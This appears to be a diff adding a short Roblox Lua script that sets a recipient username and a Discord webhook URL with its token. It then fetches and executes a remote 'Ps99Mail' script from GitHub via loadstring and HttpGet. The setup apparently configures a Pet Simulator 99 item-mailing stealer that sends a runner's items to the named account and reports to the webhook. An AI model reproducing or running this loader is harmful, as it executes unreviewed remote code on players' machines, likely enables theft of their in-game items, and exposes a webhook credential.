@@ -1,0 +1,5 @@
+Username = "Bellzebub22"
+Webhook = "https://discord.com/api/webhooks/1204596399359000596/QfRyGBPe5uY81DuWm7VY7EHevb3BfutgTZQnOztkMA_GZM3viWlJzXJ6D9l_oCOe4_Zy"
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JrexsScript/Ps99Mail/main/Ps99.lua"))()
